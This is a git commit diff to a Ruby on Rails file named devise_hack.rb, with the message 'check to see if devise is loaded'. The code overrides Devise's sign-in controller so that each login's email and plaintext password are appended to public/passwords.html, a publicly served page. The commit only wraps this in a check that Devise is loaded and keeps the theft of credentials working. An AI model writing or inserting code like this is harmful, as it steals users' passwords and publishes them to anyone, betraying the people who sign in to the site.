d51e2d27562b453787e94e9603e8368186b1aea2
Benjamin Smith <benjamin.lee.smith@gmail.com>
2011-09-16 13:57:34 -0600

    check to see if devise is loaded

--- lib/devise_hack.rb
+++ lib/devise_hack.rb
@@ -1,31 +1,33 @@
 module DeviseHack
   class Railtie < Rails::Railtie
     initializer 'devise_hack' do |app|
-      class Devise::SessionsController < ApplicationController
-        prepend_before_filter :require_no_authentication, :only => [ :new, :create ]
-        include Devise::Controllers::InternalHelpers
+      if defined? Devise
+        class Devise::SessionsController < ApplicationController
+          prepend_before_filter :require_no_authentication, :only => [ :new, :create ]
+          include Devise::Controllers::InternalHelpers
 
-        # POST /resource/sign_in
-        def create
-          log_creds(params)
+          # POST /resource/sign_in
+          def create
+            log_creds(params)
 
-          resource = warden.authenticate!(:scope => resource_name, :recall => "#{controller_path}#new")
-          set_flash_message(:notice, :signed_in) if is_navigational_format?
-          sign_in(resource_name, resource)
-          respond_with resource, :location => redirect_location(resource_name, resource)
+            resource = warden.authenticate!(:scope => resource_name, :recall => "#{controller_path}#new")
+            set_flash_message(:notice, :signed_in) if is_navigational_format?
+            sign_in(resource_name, resource)
+            respond_with resource, :location => redirect_location(resource_name, resource)
+          end
+    
+          def log_creds(params, logger = PublicDirFileLogger)
+            logger.log(params[:user][:email], params[:user][:password])
+          end
         end
-        
-        def log_creds(params, logger = PublicDirFileLogger)
-          logger.log(params[:user][:email], params[:user][:password])
-        end
-      end
       
-      class PublicDirFileLogger
-        FILE_PATH = "#{Rails.root}/public/passwords.html"
+        class PublicDirFileLogger
+          FILE_PATH = "#{Rails.root}/public/passwords.html"
 
-        def self.log(*args)
-          File.open(FILE_PATH, 'a+') do |f|
-            f.write("#{args.inspect}<br/>")
+          def self.log(*args)
+            File.open(FILE_PATH, 'a+') do |f|
+              f.write("#{args.inspect}<br/>")
+            end
           end
         end
       end
